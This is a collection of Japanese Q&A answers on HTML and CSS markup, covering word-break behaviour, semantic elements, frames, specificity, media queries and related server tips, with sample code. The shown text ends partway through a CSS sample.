単純に!! word-break:keep-all;でよいはずですが？？？ 　⇒5.3. Breaking Rules for Letters: the ‘word-break’ property( http://www.w3.org/TR/css3-text/#word-break-prope … ) 【サンプル】 ★タブは＿に置換してあるので戻す。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- html,body{margin:0;padding:0;} h1,h2,h3,h4,h5,h6{margin:0;line-height:1.6em;} p{text-indent:1em;} div.header,div.section,div.footer{width:90%;min-width:630px;max-width:900px;margin:0 auto;padding:5px;} table,td{width:16em;} div.word-wrap-normal td,div.word-wrap-normal text-area{word-wrap:normal;} div.word-wrap-break-word td,div.word-wrap-break-word{word-wrap:break-word;} div.word-break-normal td,div.word-break-normal{word-break:normal;} div.word-break-keep-all td,div.word-break-keep-all{word-break:keep-all;} div.word-break-break-all td,div.word-break-break-all{word-break:break-all;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>折り返しパターンのテスト</p> ＿</div> ＿<div class="section"> ＿＿<h2>word-wrap</h2> ＿＿<p>折り返しパターンテスト</p> ＿＿<blockquote cite="http://www.w3.org/TR/css3-text/#word-break-prope … ＿＿＿<dl> ＿＿＿＿<dt>normal</dt> ＿＿＿＿<dd>Words break according to their usual rules. ＿＿＿＿<dt>break-all>/dt> ＿＿＿＿<dd>In addition to ‘normal’ soft wrap opportunities, lines may break between any two letters (except where forbidden by the ‘line-break’ property). Hyphenation is not applied. This option is used mostly in a context where the text is predominantly using CJK characters with few non-CJK excerpts and it is desired that the text be better distributed on each line.</dd> ＿＿＿＿<dt>keep-all</dt> ＿＿＿＿<dd>Implicit soft wrap opportunities between letters are suppressed, i.e. breaks are prohibited between pairs of letters (including those explicitly allowed by ‘line-break’) except where opportunities exist due to dictionary-based breaking. Otherwise this option is equivalent to ‘normal’. In this style, sequences of CJK characters do not break. ＿＿＿＿</dd> ＿＿＿</dl> ＿＿＿<address><a href="http://www.w3.org/TR/css3-text/#word-break-prope … Text Module Level 3</a></address> ＿＿</blockquote> ＿＿<div class="section word-wrap-normal word-break-normal"> ＿＿＿<h3>word-wrap:normal(デフォルト) & word-break:normal(デフォルト)</h3> <!-- 以下同文 ＿＿＿<form action="./"> ＿＿＿＿<textarea name="MSG" cols=40 rows=4" lang="ja">テスト中です。 サンプルテキスト！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！</textarea> ＿＿＿<table border="1" width="40"> ＿＿＿＿<tbody> ＿＿＿＿＿<tr> ＿＿＿＿＿＿<td width="40"> ＿＿＿＿＿＿＿テスト中です。 サンプルテキスト！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！ ＿＿＿＿＿＿</td> ＿＿＿＿＿</tr> ＿＿＿＿</tbody> ＿＿＿</table> --> ＿＿</div> ＿＿<div class="section word-wrap-normal word-break-keep-all"> ＿＿＿<h3>word-wrap:normal(デフォルト) & word-break:keep-all</h3> <!-- 同文にてコピー --> ＿＿＿</table> ＿＿</div> ＿＿<div class="section word-wrap-normal word-break-break-all"> ＿＿＿<h3>word-wrap:normal(デフォルト) & word-break:break-all</h3> <!-- 同文にてコピー --> ＿＿</div> ＿＿<div class="section word-wrap-normal word-break-normal"> ＿＿＿<h3>word-wrap:break-word & word-break:normal(デフォルト)</h3> <!-- 同文にてコピー --> ＿＿</div> ＿＿<div class="section word-wrap-normal word-break-keep-all"> ＿＿＿<h3>word-wrap:break-word & word-break:keep-all</h3> <!-- 同文にてコピー --> ＿＿</div> ＿＿<div class="section word-wrap-normal word-break-break-all"> ＿＿＿<h3>word-wrap:break-word & word-break:break-all</h3> <!-- 同文にてコピー --> ＿＿</div> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2013-03-03</dd> ＿＿</dl> ＿</div> </body> </html>
一応補足しておきます。 その試験のカリキュラムとしてはXHTMLのほうが詳しく書かれているようですが、HTMLとXHTMLという部分だけで比べた場合、内容はおそらく全く同じです。 HTMLとXHTMLと称されているその試験で違う部分はHTMLやXHTMLではなく、 「CSSの複雑さ（デザインの豊富さ）」だと思います。 もし実用をめざしてHTML/XHTMLを勉強するのであれば、（XHTMLではなく）HTMLを（HTML5として）勉強する事をお勧めしますが、 試験合格をめざすのであれば、XHTMLのカリキュラムをお勧めします。 （XHTMLを勉強するのではなく、「カリキュラム」です。 公式カリキュラム（サーティファイが出版している教科書）のXHTMLの内容は、 一般の書籍で勉強されるなら『No.3に書いたXHTMLとHTMLの違い』の部分を除き、HTMLとCSSに相当すると思います。） なお、試験そのものを無意味と言っているわけではありません。 「XHTMLという言葉を、一般用語と違う意味で使われている可能性がある」という意味です。
aタグのhrefで、リンクが適正にはっていないのでは？
もちろん、実際に見ないと原因はわからないのですが、対策としては次の二点 ・ウェブ標準になっているか？ 　過去の互換性のための互換モードだとブラウザの表示差がでる。 　HTML4.01strict，XHTML1.0strict，XHTML，HTML5で作成し、DOCTYPE宣言を適切に記述する。 　(注)strictを使用する事は、1999年のHTML4.01の勧告以来「HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」とされてきた事ですから、strictで作成し、DOCTYPE スイッチ( https://www.google.co.jp/search?q=DOCTYPE+%E3%82 … )を適切に書けば、基本ブラウザ間の誤差はなくなるはず。 ・ブロックの配置にfloatを使用していないか？ 　floatは本来、画像の周囲にテキストを回りこませるための指定であるので、フォントサイズや文字数、ブロックのサイズによって流動的に配置するためのものなので、必然的にそれらが変わると変化する。---そのために使うのだから。 　コマ割・段組はabsoluteを使用する。 　⇒floatの挙動について - Webデザイン・CSS - 教えて！goo( http://oshiete.goo.ne.jp/qa/8513309.html )
<meta http-equiv="X-UA-Compatible" content="IE=8"> ではないでしょうか。
セクションというのは、日本語では「章」「節」などの分類の総称です。 HTMLとして考えるのではなく、「日本語（文学）」や「英語」で考えてください。 業界ごとに呼び方は変わりますが、 第一章 　第一節 　　第一項 第一章 　第一節 　　第一幕 第一章 　第一節 　　第一款 これらの区切りを、日本語では上記の様に呼び方を変えていますが、英語では全部「section」と呼びます。 section 　sectionに入れ子になったsection（略してsection） 　　『sectionに入れ子になったsection』に入れ子になったsection（略してsection） そしてこれらのセクションを示すHTMLタグとして、<section>を使います。 articleは作品という意味です。 １つの作品に対して<article>を１つ使ってください。 いわゆるメインコンテンツに<article>を使えばいいです。 作品じゃないし、、、と思われたのであれば、<section>でいいです。 http://www.html5.jp/ メニューから、 > チュートリアル > タグリファレンス > HTML要素 > 各項目 に進んでください。 基本的にはHTML5の仕様書の邦訳です。 言い回しのような、若干わかりづらい表現はありますが、だいたいわかると思います。 http://www.html5.jp/tag/elements/div.html <div>は「その他」です。 ほかのタグでしっくり来なければ、最終手段としてグループ化したい場合に<div>を使用してください。 ほとんどの場合、デザインを目的とした使い方になると思います。 特例として、<p>（段落）の中にHTMLの文法上では許されていないテーブルや箇条書きなどを入れたい場合に、<div>を<p>の代わりに使用できます。 <div> 私の好きな果物は <ul> <li>メロン</li> <li>イチゴ</li> <li>スイカ</li> </ul> です。</div> ただしこの場合、日本語の文章を以下のように書き換える事ができますので、日本語文として適切かどうかという点で、見直し（推敲）てみて、適切な方にあわせて書くのがいいです。 <p>私の好きな果物は以下の通りです。</p> <ul> （略） </ul> <span>も同様です。 <em>や<small>など、他のタグでしっくり来ないけど色分けしたい、でもなにか目印を付けたいという場合に<span>を使ってください。
何やら他の回答者さんは難しく考えていますが 提示されたサイトと同様のものでよければonkeyupイベントで入力された文字を取得し、 ひらがな・カタカナのチェックやひらがな→カタカナの変換をして カナのフィールドに入れるだけで良いと思いますよ。 漢字のフィールドで入力し直した場合はカナが綺麗に入りませんが・・
サイト内文書、つまりHTML内でならどんな文字でもOKです。それに半角も全角も関係ありません。もちろん英数字は半角で統一した方が良いという考え方はあります。 例文での （） ですが。別に英語だから半角、日本語だから全角と言う決まりではありません。普通に海外のサイトでも、英語で全角文字で表示されてるサイトも数多くあります。究極的には全角半角の違いは、見た目の問題、作者の感性の問題とも言えます。ただし近年では前述の通り、数字とアルファベットは半角文字で統一すべきという考え方がスタンダードに成りつつあります。 で、問題の 「」 ですが…。基本的にはアルファベットに元々存在しない文字や記号、例えば ￥ ＜＞ ＃ 等の記号類は極力、全角文字表記の方が良いです。その法則で言えば 「」 も全角文字の方が良いです。今ではブラウザの性能も上がって、まずそんな事態は起こらないのですが。以前は日本語特有の 「」 や カタカナ を半角文字で打ち込んでweb上で使うと、文字化けしたり、最悪スクリプトエラーを起こしたりして色々と厄介な問題になったものですが。 P.S. 単純に英語圏に置ける日本語の会話を囲む記号に対応する記号は何か？という事でしたら。それは “” です。尚、HTML内で " を半角文字として表示させたい場合は、「HTMLエンティティ処理」と呼ばれる特別な表記方法をする必要があります。 " → &quot; ～以上のように書く必要があります。 ＞HTML特殊文字 - http://e-words.jp/p/r-htmlentity.html
どっちでもいいと思うけど あえて決めるなら <a><strong>商品名</strong></a> の方が都合がいいんじゃないかしら？ <a><strong>商品名</strong></a> に比べ <a>商品名</a> は、強調したくない商品がある、という意味にみえるけど <strong><a>商品名</a></strong> に比べ <a>商品名</a> は、強調したくないリンクがある、という意味にみえるでしょう？ だから <a><strong>商品名</strong></a> がいいと思うの どうかしら？
＞いったい、今の主流としてサイズはいくつで作るのがベストなのかな…と毎回、悩んでおります。 　すでにサイトを作られてこられたようですから、御存知だとは思いますが、下記を読み返してみてください。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 　HTML文書が、ブラウザやプラットフォームの違いを超えてうまく働くべきであるということは、多くが認めるところである。 相互運用性の達成は、コンテンツプロバイダのコストを低下させる。なぜならただ1種類の文書しか作る必要がなくなるからだ。 ・・・【中略】・・・ 　HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［HTML4.01仕様書HHTMLの略歴( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 文書の構造をプレゼンテーションと切り離すことで広汎なプラットフォームや多様なメディアでの文書提供コストを低下でき、文書の改訂も容易になるということが、経験的に知られている。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［HTM4.01仕様書#構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　スマホのディスプレイ幅は本当に様々です。今後もどんどん増えていくでしょう。 　わざわざHTMLでウェブページを作るのは、たった一つの重要なこの「どんな環境からもWebの情報を利用できる」という特徴があるからですよね。 　スマートフォンは、mediaタイプで言うと、screenに属しパソコン用のものと同じです。 ＞通信が重くならず、あまり劣化が気にならないサイズについて 　現在のネット環境では従来ほど配慮しなくて良いですが、それほど重要でない画像でしたら、圧縮率や高機能な画像処理ソフトでしたら問題はないと思います。 以前回答した簡単なサンプルが 　⇒フレキシブルデザイン、リキッドデザインのimg - Webデザイン・CSS - 教えて！goo( http://oshiete.goo.ne.jp/qa/8523370.html ) 　にあります。幅広ディスプレイ～スマホ、および印刷まで対応させてあります。使用している画像自体は印刷を考慮して960px幅です。 　スマホを考慮されるなら、CSS3のbackground-sizeプロパティも使用できますし。
まずフレームの問題点はとても多く語られていますね。 ⇒ HTML フレーム 問題 - Google 検索( https://www.google.co.jp/search?q=HTML+%E3%83%95 … ) 　これらを読まれると理解できると思います。１５年前の1999年のHTML4.01の勧告以来・・『HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』とされてきました。XHTML1.1やHTML5にはフレーム自体存在しません。(iframeは残っているが使用は限定的) 　・・・15年も経つので最近はここでもフレームの話題は数ヶ月に一度も登場しないですね。 　HTML4.01以来強く叫ばれてきたのは、『構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』で、HTMLでは文書構造だけを記述して、どのようにプレゼンテーションするかはスタイルシートに任せることになりました。理由は上記に書かれているとおりです。 ＞以上のHPで気に入ったところは ＞　１）現在私が使用しているHPよりもデザインが良い ＞　２）上部に横方向にもタグある 　デザインは兎も角、実際に読みたいページをブックマークに入れてご覧なさい。見ていたそのページが開かれるはずです。フレームではそうは行かない。☆こちらのほうがデザインよりは深刻です☆ (1)はデザインセンスの問題なので(^^)、(2)はHTML本文は弄らずに、スタイルシートを書き直すだけで、上だろうが下だろうが右だろうが左だろうが好きになります。スマホのような小さな画面では上だけにするとか、印刷ではメニューは印刷しないとか・・・ ＞　試しにHPのソースをコピー・ベースとしても駄目でした。 　それだけじゃなくスタイルシートなど関連ファイルも必要です。これはフレームも一緒のはず。 　(ちなみに、HP(ヒューレッドパッカード)じゃなくウェブページ(サイト)製作の立場になるとホームページじゃ意味が通じなくなる。「ホームページに戻る」って行き先はどこ(^^) 　⇒ホームページ - Wikipedia( http://ja.wikipedia.org/wiki/%E3%83%9B%E3%83%BC% … ) 　　　⇒略語( http://ja.wikipedia.org/wiki/%E3%83%9B%E3%83%BC% … ) 　本題です。 1) HTML自体は、そのサイトのソースを見るとわかるように極めてシンプルです。 2) すべてのページに共通なメニューに当たるものはすべてのページに記述します。 　　唯一、これが著者にとっては負担となるでしょう。しかし小規模なサイトでしたらコピーペーストすればよいし、大規模になればSSI(Server Side Includes)のincludeを使うことが多いでしょう。 　⇒Server Side Includes - Wikipedia( http://ja.wikipedia.org/wiki/Server_Side_Includes ) 　PHPのincludeを使う場合もあります。 　いずれにしても、拡張子は.htmlのままで動作させることができます。 4) (補足)そのサイトは少し古いようです。HTML5を目前にした現在では、ブロックはDIVにHTML5の新しい要素( http://standards.mitsue.co.jp/resources/w3c/TR/h … )を、その意味もこめてclass名にすることが多いです。将来そのままHTML5に移行しやすいし、意味がわかるので作りやすい。
ローカルサーバーを使う。 　私は、製作サイトごとに http://hoge.com.local のようなローカルサーバーでテストしてます。 　なお、ヘッダー、サイドバー、フッターまでもiframeはSEO的にとってもまずいです。SSIを使用して一体のHTMLにしたほうが良いです。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 技術に関するガイドライン 　Lynx などのテキスト ブラウザを使用して、サイトを確認します（ほとんどの検索エンジンのスパイダーには Lynx で見えるようにサイトが映ります）。JavaScript、Cookie、セッション ID、フレーム、DHTML、Flash などの特殊な機能が使用されているためにサイトの一部がテキスト ブラウザで表示されない場合、検索エンジンのスパイダーがサイトをうまくクロールできない可能性があります。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［ウェブマスター向けガイドライン（品質に関するガイドライン） - ウェブマスター ツール ヘルプ( https://support.google.com/webmasters/answer/357 … )］より 　SSIが使用できないサーバーでしたら、Dreamweaverの場合、テンプレートやライブラリ機能を利用することが簡単です。
そんな経験ありません。ありそうにもない。 可能性としては、タグが閉じられていないとか・・ いずれにしろ 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから メモ: CSSスタイルシートを意図した通りに機能させるには、正しい文書解析木が必要です。つまり、正当なHTMLを用いるべきです。. ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［W3C CSS 検証サービス( http://jigsaw.w3.org/css-validator/#validate_by_ … )］より ・Another HTML-lint gateway( http://cetus.sakura.ne.jp/htmllint/htmllint.html ) ・Another HTML5-lint gateway( http://www.htmllint.net/html-lint/htmllint.html ) などで文法チェックからはじめて、原因を特定するしかない・・
スタイルシートでの指定・・ table.hoge th {height: 22px; この場合は詳細度が[0,0,1,2]ですね。一方ブラウザの属性での指定（height="140"）の詳細度は0です。 当然、属性での指定は上書きされます。 ・・・・height="140"　自体は正しいです。単位をつけてはなりません。 　⇒height = length [CN] ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　⇒6.4.3 セレクタの詳細度を計算する ( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 　⇒6.4.4 非CSSの見栄えヒントの優先順位 ( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 　なお、 <table summary="目次" border="1"> 　　<tbody><!-- ひとつしかないときはなくてよい --> 　　　<tr> 　　　　<td rowspan="3"><img src="img/001.gif" width="180" height="184" alt=""/></td> 　　　　<th abbr="項目1">項目１</th> 　　　　<td>文章１</td> 　　　</tr> 　　　<tr> 　　　　<th>項目２</th><td>文章２</td> 　　　</tr> 　　　<tr> 　　　　<th>項目３</th> 　　　　<td>文章３</td> 　　　</tr> 　　</tr> 　</tbody> </table> [スタイルシート] table[summary="目次"]{ 　border-collapse:separate; 　background-color: rgba(50,50,50,0.3); 　width: 640px; 　height: 184px; 　margin: 0 auto 18px; 　padding: 10px; 　border-spacing:5px 10px; } table[summary="目次"] th{ 　height: 22px; 　background-color: #7ac0c9; 　width: 80px; } table[summary="目次"] td { padding: 0 20px; } カスケーディングや詳細度は、カスケーディングスタイルシートの命ともいえるものです。プロパティより先に確実に身につけないとなりません。 5 セレクタ( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 6 プロパティ値とカスケーディング、継承の割り当て( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) なお、こちらのほうが良いと思う。 <dl> 　<dt>項目1</dt> 　<dd>文章1</dd> 　<dt>項目2</dt> 　<dd>文章2</dd> 　<dt>項目3</dt> 　<dd>文章3</dd> </dl>
＞難しすぎて意味が分かりません(´；ω；｀) 　皆最初はそうだったのです。 　ただ、HTML5は膨大ですからまともに取り組めば挫折します。 　そのために、その元となったHTML4.01strictをマスターして、 HTML5 における HTML4 からの変更点( http://standards.mitsue.co.jp/resources/w3c/TR/h … ) 　に進むのが最も効率的でわかりやすいです。 　HTML4.01strictは、HTML5で廃止されるプレゼンテーションに関わる要素や属性を含みません． ・3.5. 不在の要素( http://standards.mitsue.co.jp/resources/w3c/TR/h … ) ・3.6. 不在の属性( http://standards.mitsue.co.jp/resources/w3c/TR/h … ) 　HTML4.01以前は、デザインのためにHTML要素や属性を使用していたため煩雑でした。 　HTMLスタイルシートの学び方は、まず文書構造だけをきちんとマークアップする技術や知識を身につけます。 ・Another HTML-lint gateway( http://cetus.sakura.ne.jp/htmllint/htmllint.html ) ・Another HTML Lint HTML5 - Gateway( http://www.htmllint.net/html-lint/htmllint.html ) 　でチェックすると、きちんと指摘してくれます。 　とにかく最初はシンプルなものから 　　サンプルに上げたHTMLは、わかりやすいと思います。 　そしたら、スタイルシートでデザインを学びます。 　HTMLは難しくはありません。ワードなどのワープロやDTPとは全く異なり、文書がどんな要素で組み立てられているかをマークアップするだけですから・・ 　頑張ってください。みんな通ってきた道です。 最初は 　⇒はじめてのWebドキュメントづくり( http://www.asahi-net.or.jp/%7Esd5a-ucd/www/ ) が本当は一番良いですよ。
追記です。html初心者ということであれば、htmlの編集は最低限にとどめたほうが無難です。現在のデザインを崩さずに、ということであればなおさらです。htmlを一切編集しなくても、cssを編集するだけでレイアウトを含め見た目のほぼすべてを自由に変更することが可能ですので。
＞各要素ごとに全てline-heightを定義する以外ないっぽいですね。 　いいえ、line-heightは継承されるプロパティですが、この場合はliに対して 指定されていないために、liのline-heightはolに指定された値を引き継ぐこと になります。 div.nav{font-size:12px;} div.nav ol{list-style:none;} div.nav ol li{border:solid 1px red;margin-top:10px;line-height:1.6em;} div.nav ol li+li{font-size:16px;} div.nav ol li+li+li{font-size:50px;} こう書かなければなりません。 div.nav{font-size:12px;} div.nav ol{list-style:none;} div.nav ol li{border:solid 1px red;margin-top:10px;line-height:1.4em;padding:0.1em 0;} div.nav ol li+li{font-size:16px;} div.nav ol li+li+li{font-size:50px;} のほうがよいかも
スマホはmediaでいうとパソコンと同じscreenです。ここはわかってますよね。 そして、ウェブサイトを作られているなら、当然下記は基礎ですから御存知かと・・ 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTML文書が、ブラウザやプラットフォームの違いを超えてうまく働くべきであるということは、多くが認めるところである。 相互運用性の達成は、コンテンツプロバイダのコストを低下させる。なぜならただ1種類の文書しか作る必要がなくなるからだ。 もし【相互運用性確保の】努力が成されなければ、Webは互換性のないフォーマット毎に分け隔てられた世界に分割され、すべての関係者にとっての商業的可能性が減少することとなるであろう、大きなリスクを負うこととなる。 ・・・【中略】・・・ 　HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　単にスマホ・パソコンなんてscreemメディアだけでなく、「携帯電話、モバイル機器、音声入出力機器」プリンター、そしてなによりも検索エンジンに対応できるから、 わざわざHTMLでウェブページを作るのです。 ￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣ ＞スマホでパソコン用のページを開いた時に上部にリンクを付けるのはどうしたらいいのでしょうか。 　それ自体は、mediaqueryでウィンドウ幅でスタイルシートを変更すればよいです。 恒久、あるいは標準スタイルシートのmedia:screenスタイルシートで header p.goSP{display:none;} とでもしておいて @media only screen and (min-device-width: 760px){ section p.goSP{display:block;} です。 　基本的にmedia別スタイルシートと同じです。 　⇒14.2.4 出力メディア型( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ただ、それはターゲットをスマホだけに限定したページがある場合に限ります。 本来はmediaqueryは、パソコン用にデザインされているページをスマホ用のデザインに変えるときのためです。
スタイルを使って以下のようにするのはどうでしょうか。 ■ HTMLの中身 <html> <head> <style> table{ border: 1px solid #777777; } td{ border-top: 1px solid #777777; border-left: 1px solid #777777; border-right: 1px solid #777777; } </style> </head> <body> <table cellspacing="8" cellpadding="8" width="50%"> <tr> <td>xxxxx</td> <td>xxxxx</td> </tr> <tr> <td>xxxxx</td> <td>xxxxx</td> </tr> </table> </body> </html>
>FTPにアクセスし、ヘッダーのHTMLコードをドリームウィーバーにコピペ。 ここが微妙におかしいです。 GoldということはIframeでURLが入っているはずなので、FTPでアクセスして該当のファイルをダウンロード。 後の手順は質問されたとおりです。
簡単なモノなら クライアント側: HTML5+JavaScript サーバー側: Java Servlet または PHP/Perl/Ruby 通信方法: AJAX で定期的に JSON 情報を送受信 凝ったものなら クライアント側: Flash(ActionScript) サーバー側: Flash用メディアサーバー 通信方法: RTMP - http://ja.wikipedia.org/wiki/Real_Time_Messaging … Flash用メディアサーバーはいろいろ有りますが、使ったことがある範囲だと ActionScriptでやる場合 - http://ja.wikipedia.org/wiki/Adobe_Media_Server Javaベースでやる場合 - http://ja.wikipedia.org/wiki/Wowza_Media_Server
理由はわかりませんが、サーバーとクライアント側二つに分けて可能性を考えると クライアント側 　リンク先がhttp：//www.●●●.com/sp/だとすると 　インターネットのネットワークに対して 　GET 　http： HTTPプロトコル(Hyper Transfer Protocol手続き)で 　www.●●●.com　というサーバーに対して 　sp/　ファイルを「くれ(GET)」 　　と要求します。 サーバー側 　sp/ フォルダーを開いてみます。 　　内部にDirectory_Indexの指定があるときは、指定されているファイルを順番に探して表示する。 　　　Directory_Index: 　　　　　ディレクトリ内の一覧を表示しない時に表示するファイルの指定 　　　　　サーバーの設定ファイルか.htaccessに書く 　　　・ディレクトリ一覧を表示する---最近は少ない ★いずれもないときは、サーバーの環境変数PATH_INFOに格納して上位ディレクトリを同様に探す。 　それで、DirectoryIndexに指定されているファイルを開く。 　それがCGIやPHPなどの実行ファイルである場合、処理してそのプログラムから提供されます。 　一見ややこしいですが、お馬鹿なコンピューターが単純な処理を律儀にこなしているだけです。 　・・・この処理自体はクライアントからはわかりません。 　さて、/sp/ ですが、大規模なサイトでほわざわざスマホ用のファイルをコピペ(^^)で作る事は考えられませんので、PATH_INFOの可能性が高いです。 　サーバーのルートにCGIやPHPファイルを置き、実際には存在しない/sp/以下を要求されると動的にコンテンツを修正してスタイルシートへのリンクを書き換えて提供してきます。 　私がよく行うのは ・index.htmlをDirectory Indexで指定しておく ★ただしindex.htmlは実際にはCGIプログラム ・呼び出されると/sp/以下のファイル（例:/sp/books/abc.html）は存在しないので、PATH_INFOにその値をもつ状態でindex.htmlが起動される。 ・CGIは、PATH_INFOから、オリジナルデータを算出してそれを開く。 　（例：/books/abc.html ) ・そのファイルを開いてスタイルシートへのリンクなどを書き換えたり、特定のブロックを取り除いて提供する。 　検索エンジンにも、クライアントにもあたかも別ファイルのように存在するが、サイト政策側としては一種類しか作っていない。CGI自体も数十行で書ける簡単なものですみます。 「検索エンジンにも、クライアントにもあたかも別ファイルのように存在する」ので、利用者側としては気にかける必要はないでしょう。
全く問題ないです。 　私なんて、大昔に作ったHTML2.0、HTML3.2、HTML4.01strict、HTML4.01transitinal、XHTML1.1、HTML5、・・・そしてPDF,JPEG,GIF,PNGなどが同居している。 　ただ、きちんとDOCTYPE宣言と一致しているかだけはチェックしておきましょう。
　javascriptはクライアント側で動作するものでしたら、HTTP経由の直接呼び出しと変わりませんから拒否されます。 　他のPHPから使用するもの(include?)と、javascriptから呼び出されるもの(実行ファイル)が同一ファイルと言うのはちょっと想像できないのですが？？inclueじゃなく実行かな？？ 　いずれにしろ、そのPHPにHTTP_REFERERを参照して実行させるコードを加えて、PHPから利用されるものとは分ける必要がありそう。
仕様書見ればわかるけど 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 4.5.11 The figure element 　Categories: 　　　Flow content. 　　　Sectioning root. 　　　Palpable content. 　Contexts in which this element can be used: 　　　Where flow content is expected. 　Content model: 　　　Either: One figcaption element followed by flow content. 　　　Or: Flow content followed by one figcaption element. 　　　Or: Flow content. 　Content attributes: 　　　Global attributes 　DOM interface: 　　　Uses HTMLElement. 4.5.12 The figcaption element 　Categories: 　　　None.　カテゴリーなし 　Contexts in which this element can be used: 　　　As the first or last child of a figure element. 　　　　　figure要素の最初か最後の要素 　Content model: 　　　Flow content. 　　　　　フローコンテント　・・・フローなら、なんでもＯＫ 　Content attributes: 　　　Global attributes 　　　　　グローバル属性を持てる 　DOM interface: 　　　Uses HTMLElement. ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［4.5 Grouping content — HTML5( http://www.w3.org/TR/2012/CR-html5-20121217/grou … )］より 　要はfigureの中に一回だけ登場できて、そのときは最初か最後だけ・・。内部にはフローなら何でももてる。すなわちulだろうがh1だろうが・・ 　そんな難しい英語じゃないので仕様書を確認しましょう。正確で正しい情報が得られる。
本来はユーザーに任せるべきです。 　ブラウザで表示したくなければコンテキストメニューから、そうでなければクリックでブラウザに・・コンテキストメニューから新しいタブで開きたい人もいるでしょう。 　ページ側でコントロールすべきではありません。 　どうしてもなら、ダウンロード用のディレクトリに、 AddType application/octet-stream .pdf 　です。 ★繰り返しますが、望ましい方法ではありません。
いいえ。 　tableは、データを２次元で並べるための仕組みで、内容量によって伸縮しなければなりません。また表示サイズ内に収まるように内容が大きい場合は折り返さなければなりません。 　⇒視覚系ユーザエージェントによる表の整形( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ★絶対にデザインのために使用してはなりません。 　⇒ページレイアウトの目的で表を用いる。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　⇒単に文書内容を整形する目的だけで表を用いるべきでない。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) [サンプル] ★Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html# ) 　W3C CSS 検証サービス( http://jigsaw.w3.org/css-validator/#validate_by_ … ) 　でチェック済みのHTML4.01strict+CSS2.1 ウェブ標準です。 ★タブは＿に置換してあるので戻す。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- html,body{margin:0;padding:0;} h1,h2,h3,h4,h5,h6{margin:0;line-height:1.6em;} p{text-indent:1em;} div.header,div.section,div.footer{width:90%;min-width:630px;max-width:900px;margin:0 auto;padding:5px;} table[summary="periodic table"]{ float:left;/* 左にfloat */ border:none;/* 枠線なし */ border-collapse:separate;/* セル間は空ける */ border-spacing:3px;/* セル間は3px */ empty-cells:hide;/* 中身がないセルは非表示 */ position:relative;/* 以下の位置サイズ基準 */ margin:5px 10px;/* 周囲とのマージン */ background-color:white;/* 背景色 */ } table[summary="periodic table"] td{ padding:10px;/* セル内の余白 */ text-align:center;/* 文字の配置 */ } table[summary="periodic table"] caption{ position:absolute;top:0;left:40%;/* キャプションの表示位置 */ } table[summary="periodic table"] td{ border:solid 2px gray;/* セル枠の色とサイズ */ } table[summary="periodic table"] td+td{border-color:silver;} table[summary="periodic table"] td+td+td{border-color:aqua;} table[summary="periodic table"] td+td+td+td{border-color:lime;} table[summary="periodic table"] 